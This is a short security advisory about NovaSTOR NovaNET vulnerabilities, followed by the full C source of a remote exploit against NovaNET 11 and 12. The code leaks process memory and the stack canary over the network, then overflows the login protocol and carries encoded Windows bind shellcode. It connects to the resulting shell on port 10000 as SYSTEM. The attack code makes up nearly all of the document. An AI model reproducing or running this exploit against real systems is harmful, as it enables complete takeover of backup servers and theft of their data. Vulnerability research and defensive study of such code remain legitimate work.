source: http://www.securityfocus.com/bid/39693/info
  
NovaStor NovaNET is prone to code-execution, denial-of-service, and information-disclosure vulnerabilities.
  
An attacker can exploit these issues to execute arbitrary code, access sensitive information, or crash the affected application, denying service to legitimate users. Successful attacks may result in the complete compromise of an affected computer.
  
NovaNET 11 and 12 are vulnerable to all of these issue; NovaBACKUP Network 13 is affected by a denial-of-service vulnerability.

/* novanet-own.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NovaSTOR NovaNET <= 12.0 remote SYSTEM exploit
 * by mu-b - Tue Sep 25 2007
 *
 * - Tested on: NovaSTOR NovaNET 11.0
 *
 * A remote buffer overflow in the login protocol allows arbitrary
 * code execution as SYSTEM, however, the vulnerable function is
 * contained in a DLL (nnwindtb.dll) compiled with /gs.
 *
 * Thus we exploit another vulnerability to remotely read arbitrary
 * memory and retrieve the stack canary from nnwindtb.dll @ 0x016A6784.
 *
 * Note: this was silently fixed in NovaBACKUP NETWORK 13.0
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

#define HAS_NULL(a)           (((a) - 0x01010101) & ~(a) & 0x80808080)
#define CANARY_VAL(a,b)       (a ^ b)

/* offset defines           */
#define NTDLL_ESP             0x7C86A01B

/* thread info defines      */
#define NOVANET_THREAD_NAME   "Sup: Work to Do"

#define NOVANET_TEB_BLKS      2
static struct {
  void *teb_start;
  int teb_num;
} teb_addrs[2] = { { (void *) 0x7FFDF000, 11 },
                   { (void *) 0x7FFB0000, 5  } };

#define WIN32_TEB_SZ          0x1000

/* packet structure defines */
#define NOVANET_HDR_SZ        0x14
#define NOVANET_PKT_SZ        0x92
#define NOVANET_DOMAIN_SZ     0x1F
#define NOVANET_BUF_SZ        0x400

/* memory read defines      */
#define NOVANET_READ_SZ       sizeof (void *)
#define NOVANET_INT_IDX       32
#define NOVANET_OFFSET        0x100EC480
#define NOVANET_CALC_INT(a)   (((int) (a)-NOVANET_OFFSET-16)/sizeof (int))
#define NOVANET_SET_INT(a,b)  *((unsigned int *) &a[NOVANET_INT_IDX]) = b;

#define PORT_SHELL            10000
#define NOVANET_TCP_PORT      3817
#define USLEEP_TIME           100000

static char getdomain_buf[] =
  "\x54\x84\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x92\x00\x00\x00"
  "\xff\xff\xff\xff\x08\x40\x80\x00\x16\xaa\x11\x02\x4c\x84\xf4\x01"
  "\x01\x00\x00\x00\xc0\xa8\x01\xbc\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00" "digit-labs!$"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00" "Sup: Get Domain Address"
  "\x00\x00\xff\xff\x00\x00\x06\x10";

static char ack_buf[] =
  "\x51\x84\x00\x00\x00\x00\x00\x30"
  "\x05\x00\x00\x00"
  "\x18\x00\x00\x00"  /* remaining length */
  "\x00\x00\x00\x00"
  "\x01\x00\x00\x00";

static char hup_buf[] =
  "\x56\x84\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x14\x00\x00\x00"  /* remaining length */
  "\x00\x00\x00\x00";

static char login_buf[] =
  "\x54\x84\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x92\x00\x00\x00"
  "\xff\xff\xff\xff\x09\x20\x80\x00\xcb\x14\x4C\x02\x41\xda\x2e\x02"
  "\x01\x00\x00\x00\xc0\xa8\x01\xbc\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
  "\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
  "\x69\x69\x69" "Dtb: Context"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\xff\xff\x00\x00\x06\x10";

static char rem_buf[] =
  "\x51\x84\x00\x00\x02\x02\x02\x32"
  "\x18\x00\x00\x00"
  "\x00\x00\x00\x00"  /* remaining length */
  "\x00\x00\x00\x00";

static char win32_x86_bind[] =
  "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x8e"
  "\x2b\xb7\x2a\x83\xeb\xfc\xe2\xf4\x72\x41\x5c\x67\x66\xd2\x48\xd5"
  "\x71\x4b\x3c\x46\xaa\x0f\x3c\x6f\xb2\xa0\xcb\x2f\xf6\x2a\x58\xa1"
  "\xc1\x33\x3c\x75\xae\x2a\x5c\x63\x05\x1f\x3c\x2b\x60\x1a\x77\xb3"
  "\x22\xaf\x77\x5e\x89\xea\x7d\x27\x8f\xe9\x5c\xde\xb5\x7f\x93\x02"
  "\xfb\xce\x3c\x75\xaa\x2a\x5c\x4c\x05\x27\xfc\xa1\xd1\x37\xb6\xc1"
  "\x8d\x07\x3c\xa3\xe2\x0f\xab\x4b\x4d\x1a\x6c\x4e\x05\x68\x87\xa1"
  "\xce\x27\x3c\x5a\x92\x86\x3c\x6a\x86\x75\xdf\xa4\xc0\x25\x5b\x7a"
  "\x71\xfd\xd1\x79\xe8\x43\x84\x18\xe6\x5c\xc4\x18\xd1\x7f\x48\xfa"
  "\xe6\xe0\x5a\xd6\xb5\x7b\x48\xfc\xd1\xa2\x52\x4c\x0f\xc6\xbf\x28"
  "\xdb\x41\xb5\xd5\x5e\x43\x6e\x23\x7b\x86\xe0\xd5\x58\x78\xe4\x79"
  "\xdd\x78\xf4\x79\xcd\x78\x48\xfa\xe8\x43\x90\x3a\xe8\x78\x3e\xcb"
  "\x1b\x43\x13\x30\xfe\xec\xe0\xd5\x58\x41\xa7\x7b\xdb\xd4\x67\x42"
  "\x2a\x86\x99\xc3\xd9\xd4\x61\x79\xdb\xd4\x67\x42\x6b\x62\x31\x63"
  "\xd9\xd4\x61\x7a\xda\x7f\xe2\xd5\x5e\xb8\xdf\xcd\xf7\xed\xce\x7d"
  "\x71\xfd\xe2\xd5\x5e\x4d\xdd\x4e\xe8\x43\xd4\x47\x07\xce\xdd\x7a"
  "\xd7\x02\x7b\xa3\x69\x41\xf3\xa3\x6c\x1a\x77\xd9\x24\xd5\xf5\x07"
  "\x70\x69\x9b\xb9\x03\x51\x8f\x81\x25\x80\xdf\x58\x70\x98\xa1\xd5"
  "\xfb\x6f\x48\xfc\xd5\x7c\xe5\x7b\xdf\x7a\xdd\x2b\xdf\x7a\xe2\x7b"
  "\x71\xfb\xdf\x87\x57\x2e\x79\x79\x71\xfd\xdd\xd5\x71\x1c\x48\xfa"
  "\x05\x7c\x4b\xa9\x4a\x4f\x48\xfc\xdc\xd4\x67\x42\x61\xe5\x57\x4a"
  "\xdd\xd4\x61\xd5\x5e\x2b\xb7\x2a";

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      fprintf (stderr, "sock_send: send() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  int n;
  if ((n = recv (fd, dst, len, 0)) < 0)
    {
      fprintf (stderr, "sock_recv: recv() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static void
shellami (int fd)
{
  int n;
  fd_set rset;
  char rbuf[1024];

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (fd, &rset);
      FD_SET (STDIN_FILENO, &rset);

      if (select (fd + 1, &rset, NULL, NULL, NULL) < 0)
        {
          fprintf (stderr, "shellami: select() - %s\n", strerror (errno));
          exit (EXIT_FAILURE);
        }

      if (FD_ISSET (fd, &rset))
        {
          if ((n = sock_recv (fd, rbuf, sizeof (rbuf) - 1)) <= 0)
            {
              fprintf (stderr, "shellami: connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          rbuf[n] = '\0';
          printf ("%s", rbuf);
          fflush (stdout);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, rbuf, sizeof (rbuf) - 1)) > 0)
            {
              rbuf[n] = '\0';
              sock_send (fd, rbuf, n);
            }
        }
    }
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      fprintf (stderr, "sockami: socket() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      fprintf (stderr, "sockami: gethostbyname() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      fprintf (stderr, "sockami: connect() - %s\n", strerror (errno));
      return (-1);
    }

  return (fd);
}

static void
novanet_read_pkt_init (char *pkt)
{
  char *ptr = pkt;

  /* add packet header */
  *ptr++ = 0x54;
  *ptr++ = 0x84;

  /* add padding */
  memset (ptr, 0x00, 0x1E);
  ptr   += 0x1E;

  /* add our dodgy-int */
  memset (ptr, 0x69, sizeof (int));
  ptr   += sizeof (int);

  memset (ptr, 0x00, NOVANET_PKT_SZ-(ptr-pkt));
}

static int
novanet_read (char *host, void *start, void *dst)
{
  fd_set r_fds;
  struct timeval tv;
  int fd, n;
  char buf[NOVANET_PKT_SZ], rbuf[NOVANET_PKT_SZ];

  novanet_read_pkt_init (buf);
  start = (void *) NOVANET_CALC_INT (start);

  fd = sockami (host, NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "novanet_read: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  NOVANET_SET_INT (buf, (unsigned int) start);
  if ((n = sock_send (fd, buf, sizeof buf)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_read: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      return (0);
    }

  FD_ZERO (&r_fds);
  FD_SET (fd, &r_fds);
  tv.tv_sec = 4;        /* wait 4 seconds */
  tv.tv_usec = 0;

  n = select (fd + 1, &r_fds, NULL, NULL, &tv);
  if (n == -1)
    {
      fprintf (stderr, "novanet_read: select() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }
  else if (n)
    {
      if ((n = sock_recv (fd, rbuf, sizeof rbuf)) != NOVANET_PKT_SZ)
        {
          fprintf (stderr, "novanet_read: sock_recv returned %d (!= %d)\n",
                   n, NOVANET_PKT_SZ);
          return (0);
        }
    }
  else
    {
      fprintf (stderr, "novanet_read: select timeout, we may have crashed NovaNET :(\n");
      exit (EXIT_FAILURE);
    }

  memcpy (dst, &rbuf[NOVANET_INT_IDX], sizeof (void *));
  usleep (USLEEP_TIME);
  close (fd);

  return (1);
}

static void
novanet_read_str (char *host, void *start, char *dst, int dst_len)
{
  char r_val[NOVANET_READ_SZ], *ptr;
  void *r_addr;
  int nbytes;

  nbytes = 0;
  ptr = dst;
  r_addr = start;

  do
    {
      if (novanet_read (host, r_addr, &r_val) == 0)
        break;

      strncpy (ptr, r_val, 4);
      if (HAS_NULL (*(int *) r_val))
        break;

      ptr    += 4;
      r_addr += 4;
      nbytes += 4;
    }
  while (nbytes < dst_len - 5);
}

static int 
novanet_map_process (char *host, int *esp_val)
{
  void *r_addr, *teb_addr, *thr_list, *arg_addr;
  int i, j, num_threads, thr_count;
  char r_buf[NOVANET_BUF_SZ];

  r_addr = (void *) 0x10133C60 + 0x12510;
  if (novanet_read (host, r_addr, &thr_count) == 0)
    return (-1);

  printf ("** [nnwinsup.dll @ 0x10133C60+0x12510] thread list used: 0x%08X\n",
          thr_count);

  num_threads = 0;
  r_addr = (void *) 0x10133C60 + 0xB938;
  if (novanet_read (host, r_addr, &thr_list) == 0)
    return (-1);

  printf ("*** [nnwinsup.dll @ 0x10133C60+0x0B938] head ptr: 0x%08X\n", (int) thr_list);

  arg_addr = NULL;
  while ((r_addr = thr_list))
    {
      if (novanet_read (host, r_addr, &thr_list) == 0)
        return (-1);

      novanet_read_str (host, r_addr + 0xE8, r_buf, sizeof r_buf);

      printf ("*** [nnwinsup.dll @ 0x%08X] next ptr: 0x%08X, name: \"%s\"\n",
              (int) r_addr, (int) thr_list, r_buf);

      if (strcmp (r_buf, NOVANET_THREAD_NAME) == 0)
        arg_addr = r_addr;

      if (thr_list != NULL)
        num_threads++;
    }

  printf ("** [nnwinsup.dll @ 0x10133C60+0x0B938] thread count: %d\n", num_threads);

  if (arg_addr == NULL)
    return (-1);

  for (i = 0; i < NOVANET_TEB_BLKS; i++)
    {
      teb_addr = teb_addrs[i].teb_start - WIN32_TEB_SZ;
      printf ("** [TEB BLK @ 0x%08X] scanning %d blocks\n", (int) teb_addr, teb_addrs[i].teb_num);

      for (j = 0; j < teb_addrs[i].teb_num; j++, teb_addr -= WIN32_TEB_SZ)
        {
          int st_addr, sb_addr, thr_id;
          void *thr_arg;

          r_addr = teb_addr + 0x04;
          if (novanet_read (host, r_addr, &st_addr) == 0)
            break;

          r_addr = teb_addr + 0x08;
          if (novanet_read (host, r_addr, &sb_addr) == 0)
            break;

          r_addr = teb_addr + 0x24;
          if (novanet_read (host, r_addr, &thr_id) == 0)
            break;

          if (st_addr != 0xFFFFFFFF)
            {
              r_addr = (void *) st_addr - 0x7C;

              if (novanet_read (host, r_addr, &thr_arg) == 0)
                break;
            }
          else
            thr_arg = (void *) 0xDEADBEEF;

          printf ("** [TEB @ 0x%08X] thread id: %04X, stack base: 0x%08X, top: 0x%08X, arg: 0x%08X\n",
                  (int) teb_addr, thr_id, sb_addr, st_addr, (int) thr_arg);

          if (thr_arg == arg_addr)
            {
              printf ("** [TEB @ 0x%08X] found thread id: %04X, stack top: 0x%08X, ESP: 0x%08X\n",
                      (int) teb_addr, thr_id, st_addr, st_addr - 0x444);
              *esp_val = st_addr - 0x444;

              return  (0);
            }
        }
    }

  return (-1);
}

static void
novanet_get_domain (char *thost, char *d_name)
{
  char rbuf_hdr[NOVANET_HDR_SZ], rbuf_pkt[NOVANET_PKT_SZ], *pkt_ptr;
  int fd, n, rlen;

  fd = sockami (thost, NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "novanet_get_domain: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n", thost, NOVANET_TCP_PORT);

  printf ("** sending getdomain_buf packet...");
  if ((n = sock_send (fd, getdomain_buf, sizeof getdomain_buf - 1)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_get_domain: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading first reply...");
  if ((n = sock_recv (fd, rbuf_pkt, sizeof rbuf_pkt)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_get_domain: sock_recv returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  memcpy (d_name, &rbuf_pkt[0x54], NOVANET_DOMAIN_SZ);
  printf ("** remote domain address: %.*s\n", NOVANET_DOMAIN_SZ, d_name);

  printf ("** sending ack packet...");
  if ((n = sock_send (fd, ack_buf, sizeof ack_buf - 1)) != NOVANET_HDR_SZ + 4)
    {
      fprintf (stderr, "novanet_get_domain: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ + 4);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading second reply...");
  if ((n = sock_recv (fd, rbuf_hdr, sizeof rbuf_hdr)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_get_domain: sock_recv returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  rlen  = *(unsigned int *) &rbuf_hdr[12];
  if (rlen < NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_get_domain: remaining length invalid (<%d)\n",
               NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }

  rlen -= NOVANET_HDR_SZ;
  printf ("** reading %d-remaining bytes...", rlen);
  pkt_ptr = malloc (rlen * sizeof (char));

  if ((n = sock_recv (fd, pkt_ptr, rlen)) != rlen)
    {
      fprintf (stderr, "novanet_get_domain: sock_recv returned %d (!= %d)\n",
               n, rlen);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  free (pkt_ptr);

  printf ("** sending hup packet...");
  if ((n = sock_send (fd, hup_buf, sizeof hup_buf - 1)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n");

  usleep (USLEEP_TIME);
  close (fd);
}

static void
novanet_own_process (char *thost, char *d_name, int esp_val)
{
  char rbuf_pkt[NOVANET_PKT_SZ], *ptr;
  int canary_val, fd, n, rlen;

  if (novanet_read (thost, (void *) 0x016A6784, &canary_val) == 0)
    {
      fprintf (stderr, "novanet_own_process: reading canary failed\n");
      exit (EXIT_FAILURE);
    }

  fd = sockami (thost, NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "novanet_own_process: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("** [nnwindtb.dll @ 0x016A6784] stack canary: 0x%08X\n\n", (int) canary_val);
  if (HAS_NULL (CANARY_VAL(canary_val, esp_val)))
    {
      fprintf (stderr, "novanet_own_process: canary value invalid :(\n");
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n", thost, NOVANET_TCP_PORT);

  memcpy (&login_buf[0x54], d_name, NOVANET_DOMAIN_SZ);

  printf ("** sending login packet...");
  if ((n = sock_send (fd, login_buf, sizeof login_buf - 1)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading fourth packet...");
  if ((n = sock_recv (fd, rbuf_pkt, sizeof rbuf_pkt)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_recv returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  rlen = 0x10C + 64 + (sizeof win32_x86_bind - 1) + 1;
  *(unsigned int *) &rem_buf[12] = rlen + NOVANET_HDR_SZ;

  printf ("** sending remaining %d-bytes packet...", rlen);
  if ((n = sock_send (fd, rem_buf, sizeof rem_buf - 1)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** sending hammer packet...");

  ptr = malloc (rlen * sizeof (char));
  memset (ptr, 0x41, rlen);
  *(unsigned int *) &ptr[0x104] = CANARY_VAL(canary_val, esp_val);
  *(unsigned int *) &ptr[0x108] = NTDLL_ESP;
  memcpy (&ptr[0x10C + 64], win32_x86_bind, sizeof win32_x86_bind - 1);
  ptr[rlen - 1] = '\0';

  if ((n = sock_send (fd, ptr, rlen)) != rlen)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, rlen);
      exit (EXIT_FAILURE);
    }

  free (ptr);
  printf ("done\n\n");

  usleep (USLEEP_TIME);
  close (fd);

  printf ("* waiting for the shellcode to be executed...\n");
  sleep (2);
 
  if ((fd = sockami (thost, PORT_SHELL)) != -1)
    {
      printf ("+Wh00t!\n\n");
      shellami (fd);
    }
}

int
main (int argc, char **argv)
{
  char d_name[NOVANET_DOMAIN_SZ];
  int esp_val;

  printf ("NovaSTOR NovaNET <= 12.0 remote SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  esp_val = 0xdeadbeef;

  printf ("* mapping remote process...\n");
  if (novanet_map_process (argv[1], &esp_val) < 0)
    {
      fprintf (stderr, "novanet_map_process: unable to locate thread :(\n");
      exit (EXIT_SUCCESS);
    }
  printf ("* done\n\n");

  novanet_get_domain (argv[1], d_name);
  novanet_own_process (argv[1], d_name, esp_val);

  return (EXIT_SUCCESS);
}
